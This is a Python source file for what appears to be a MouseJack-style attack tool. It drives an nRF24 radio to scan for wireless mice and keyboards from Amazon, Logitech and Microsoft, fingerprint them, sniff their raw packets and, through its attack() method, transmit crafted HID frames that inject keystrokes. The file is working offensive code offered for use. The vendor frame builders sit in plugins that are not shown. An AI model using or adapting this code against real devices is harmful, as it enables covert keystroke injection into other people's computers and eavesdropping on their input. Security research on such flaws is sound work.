# -*- coding: utf-8 -*-

import sys
import time
from zerojack.lib import nrf24
from zerojack.plugins import amazon, logitech, microsoft, microsoft_enc


class MouseJack(object):
    ''' Class for scanning, sniffing and attacking devices '''

    def __init__(self, spi_bus = 0, spi_device = 0, ce_pin = 25, irq_pin = 24):
        '''
        Initialize NRF24 radio
        Defaults are(BCM numbering): RPi SPI0.0, CE pin 25, IRQ pin 24
        '''
        self.read_pipe_id = 0 # nrf24.NRF24.RX_ADDR_P0
        self.sniff_pipe_id = 1 # nrf24.NRF24.RX_ADDR_P1
        self.scan_pipe_address = [0xAA, 0x00, 0x00, 0x00, 0x00]
        self.reading_pipe_address = [0x13, 0x37, 0x00, 0xCA, 0xFE]
        self.channels = range(2, 84)
        self._devices = {}
        self.ping = [0x0f, 0x0f, 0x0f, 0x0f]
        self._plugins = [amazon, logitech, microsoft, microsoft_enc]

        self.radio = nrf24.NRF24(spi_bus, spi_device, ce_pin, irq_pin)
        
    @property
    def devices(self):
        return self._devices

    def from_display(self, data):
        result = None
        try:
            result = [int(b, 16) for b in data.split(':')]
        except:
            print('from_display(): Failed to convert string to bytes list!')
            sys.exit(-1)
        return result

    def to_display(self, data):
        result = None
        try:
            result = ':'.join('{:02X}'.format(x) for x in data)
        except:
            print('to_display(): Failed to convert bytes list to hexadecimal string!')
            sys.exit(-1)
        return result

    def add_device(self, address, payload, channel_index):
        if not isinstance(address, list):
            raise TypeError('Address parameter must be a list of bytes!')
        address_str = self.to_display(address)

        hid_class = self.get_hid(payload)
        if hid_class is None: # Don't add a device if we cannot determine its type.
            return
        channel = self.channels[channel_index]
        if address_str in self._devices:
            self._devices[address_str]['count'] += 1
            self._devices[address_str]['timestamp'] = time.time()
            self._devices[address_str]['payload'] = payload
            if channel not in self._devices[address_str]['channels']:
                self._devices[address_str]['channels'].append(channel)
            if self._devices[address_str]['device'] is None:
                self._devices[address_str]['device']  = hid_class
        else:
            self._devices[address_str] = {}
            self._devices[address_str]['index']     = len(self._devices)
            self._devices[address_str]['count']     = 1
            self._devices[address_str]['timestamp'] = time.time()
            self._devices[address_str]['channels']  = [self.channels[channel_index]]
            self._devices[address_str]['address']   = address
            self._devices[address_str]['device']    = hid_class
            self._devices[address_str]['payload']   = payload

    def clear_devices(self):
        self._devices = {}
        return

    def set_channel(self, channel):
        self.radio.setChannel(channel)

    def shift_payload_right(self, payload):
        '''
        Shift payload right by one bit
        '''
        for x in range(len(payload)-1, -1, -1):
            if x > 0:
                payload[x] = (payload[x-1]<<7)&0xff | payload[x]>>1
            else:
                payload[x] = payload[x]>>1
        return payload

    def shift_payload_left(self, payload):
        '''
        Shift payload left by one bit
        '''
        for x in range(0, len(payload)-1):
            if x < 26:
                payload[x] = (payload[x]<<1)&0xff | (payload[x+1]&0x80)>>7
            else:
                payload[x] = payload[x]<<1
        return payload

    def crc_update(self, crc, byte, bits):
        '''
        Update CRC16 CCITT
        '''
        crc = crc ^(byte << 8)
        while bits>0:
            if (crc & 0x8000) == 0x8000:
                crc = (crc << 1) ^ 0x1021
            else:
                crc = crc << 1
            bits -= 1
        crc = crc & 0xFFFF
        return crc

    def extract_payload(self, raw_data):
        if len(raw_data) > 0:
            # Try to find a valid packet
            # (mousejack code ported to Python)
            for i in range(2):
                if i == 1:
                    # Unshift the payload (shift right).
                    raw_data = self.shift_payload_right(raw_data)

                # Shift payload left.
                packet = self.shift_payload_left(raw_data[5:])
                # Retrieve packet length from the packet itself.
                packet_len = (packet[0]>>3)
                if packet_len < 24:
                    # Ensure CRC is valid.
                    crc_expected = packet[packet_len + 2]<<8 | packet[packet_len + 1]
                    if packet[packet_len + 3] & 0x80:
                        crc_expected |= 0x100
                    bin_packet = ''.join(map(chr, raw_data))
                    crc = 0xFFFF
                    for x in range(6 + packet_len):
                        crc = self.crc_update(crc, ord(bin_packet[x]), 8)
                    crc = self.crc_update(crc, ord(bin_packet[6+packet_len])&0x80,1)
                    crc = ((crc<<8) | (crc>>8))&0xffff
                    if crc == crc_expected:
                        return packet[1:packet_len+1]
        return []

    def enter_promiscuous_mode(self):
        '''
        Enable NRF24L promiscuous mode
        More details: https://travisgoodspeed.blogspot.com/2011/02/promiscuity-is-nrf24l01s-duty.html
        '''
        # The order of the calls is important!
        self.radio.reset()
        
        self.radio.setAutoAck(False)
        self.radio.setPALevel(nrf24.NRF24.PA_MIN)
        self.radio.setDataRate(nrf24.NRF24.BR_2MBPS)
        self.radio.enableLNA() # Not sure if it really works.
        self.radio.setChannel(2)
        self.radio.write_register(nrf24.NRF24.EN_RXADDR, 0x00)
        self.radio.write_register(nrf24.NRF24.SETUP_AW, 0x00)
        self.radio.dynamic_payloads_enabled = False
        self.radio.setPayloadSize(nrf24.NRF24.MAX_PAYLOAD_SIZE) # Maximal payload size is 32 bytes.
        self.radio.openReadingPipe(self.read_pipe_id, self.scan_pipe_address)
        self.radio.disableCRC()
        self.radio.startListening()

    def scan(self, callback=None):
        '''
        Scan to identify potential targets.
        IMPORTANT: before using first call enter_promiscuous_mode()!
        '''
        channel_index = 0
        self.set_channel(self.channels[channel_index])
        dwell_time = 0.1
        timeout = 10
        last_tune = time.time()
        start_time = time.time()
        payload = []
        recv_buffer = []

        while time.time() - start_time < timeout:
            if (time.time() - last_tune) > dwell_time:
                channel_index = (channel_index + 1) % (len(self.channels))
                self.set_channel(self.channels[channel_index])
                last_tune = time.time()

            if self.radio.available():
                self.radio.read(recv_buffer, nrf24.NRF24.MAX_PAYLOAD_SIZE)

                if (len(recv_buffer) >= 10): # Minimum lenght that covers all vendors.
                    payload = self.extract_payload(recv_buffer)
                    if (len(payload) >= 5):
                        address = recv_buffer[0:5]
                        self.add_device(address, payload, channel_index)
                        if callback:
                            callback(self._devices)
        self.radio.flush_rx()
        return

    def enter_receiving_mode(self, read_pipe_id, address):
        '''
        Prepare NRF24 to receive data.
        '''
        if not isinstance(address, list):
            raise TypeError('Address parameter must be a list of bytes!')
        # It's necessary to reverse address as NRF24L01(+) expects LSB first.
        address_rev = address[::-1]
        self.radio.openReadingPipe(read_pipe_id, address_rev)
        self.radio.enableDynamicPayloads()
        self.radio.setAutoAck(False)
        self.radio.setCRCLength(self.radio.CRC_16)
        self.radio.setPALevel(nrf24.NRF24.PA_MIN)
        self.radio.setDataRate(nrf24.NRF24.BR_2MBPS)
        self.radio.startListening()

    def enter_transmission_mode(self, address, auto_ack=True):
        '''
        Prepare NRF24 to transmit.
        '''
        if not isinstance(address, list):
            raise TypeError('Address parameter must be a list of bytes!')
        # It's necessary to reverse address due to NRF24L01(+) expects LSB first.
        address_rev = address[::-1]
        self.radio.stopListening()
        self.radio.setRetries(5, 15)
        self.radio.setAddressWidth(5)
        self.radio.openWritingPipe(address_rev)
        self.radio.enableDynamicPayloads()
        self.radio.setAutoAck(auto_ack)
        self.radio.setCRCLength(self.radio.CRC_16)
        self.radio.setPALevel(nrf24.NRF24.PA_MAX)
        self.radio.setDataRate(nrf24.NRF24.BR_2MBPS)

    def transmit_payload(self, address, payload, auto_ack):
        if not isinstance(address, list):
            raise TypeError('Address parameter must be a list of bytes!')
        self.enter_transmission_mode(address, auto_ack)
        is_transmitted = self.radio.write(payload)
        self.radio.startListening()
        return is_transmitted

    def find_active_channel(self, address, channels):
        '''
        Find active channel for a specific address.
        '''
        if not isinstance(address, list):
            raise TypeError('Address parameter must be a list of bytes!')
        active_channel = None
        self.enter_receiving_mode(self.read_pipe_id, self.reading_pipe_address) # pipe 0
        for channel in channels:
            self.set_channel(channel)
            if self.transmit_payload(address, self.ping, True):
                active_channel = channel
                break
        return active_channel

    def sniff(self, address, dwell_time=0.3):
        '''
        Sniff data at the particular address.
        '''
        last_tune = time.time()
        self.enter_receiving_mode(self.sniff_pipe_id, address) # Sniff at second (P1) reading pipe.
        active_channel = 2
        self.set_channel(active_channel)
        recv_buffer = []

        while True:
            try:
                if (time.time() - last_tune) > dwell_time:
                    active_channel = self.find_active_channel(address, self.channels)
                    if active_channel:
                        self.set_channel(active_channel)
                    last_tune = time.time()

                if self.radio.available([self.sniff_pipe_id]):
                    self.radio.read(recv_buffer, nrf24.NRF24.MAX_PAYLOAD_SIZE)
                    print(f'[{time.strftime("%H:%M:%S")}] Channel: {active_channel} Raw bytes: {self.to_display(recv_buffer)}')
                    self.radio.flush_rx()
            except Exception as e:
                raise e

    def get_hid(self, payload):
        if not payload:
            return None
        for hid in self._plugins:
            if hid.HID.fingerprint(payload):
                return hid.HID
        return None

    def attack(self, hid, attack):
        hid.build_frames(attack)
        for key in attack:
            if key['frames']:
                for frame in key['frames']:
                    self.transmit_payload(hid.address, frame[0], True)
                    time.sleep(frame[1] / 1000.0)

    def finish(self):
        '''
        Prepare to exit, free resources and switch device to sleep mode.
        '''
        self.radio.stopListening()
        self.radio.powerDown()
        self.radio.end()
